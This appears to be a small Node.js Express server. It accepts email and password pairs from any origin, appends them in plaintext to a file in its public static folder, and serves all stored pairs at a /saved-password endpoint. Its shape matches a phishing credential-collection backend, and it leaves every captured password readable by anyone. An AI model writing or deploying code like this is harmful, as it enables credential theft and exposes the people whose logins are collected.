const express = require("express");
const bodyParser = require("body-parser");
const port = process.env.PORT || 3000;
const app = express();
const fs = require("fs");
const cors = require("cors");

app.use(cors());
app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));
// static file public
app.use(express.static("public"));
app.post("/post", function (req, res) {
  const { email, password } = req.body;
  // save to file .txt
  fs.appendFile(
    "./public/user.txt",
    `email : ${email} password : ${password}\n`,
    function (err) {
      if (err) throw err;
      return res.status(200).json("success");
    }
  );
});

app.get("/saved-password", function (req, res) {
  fs.readFile("./public/user.txt", function (err, data) {
    if (err) throw err;
    let arr = data.toString().split("\n");
    arr.pop();
    return res.status(200).json(arr);
  });
});

app.listen(port, () => {
  console.log("Server is running on port " + port);
});
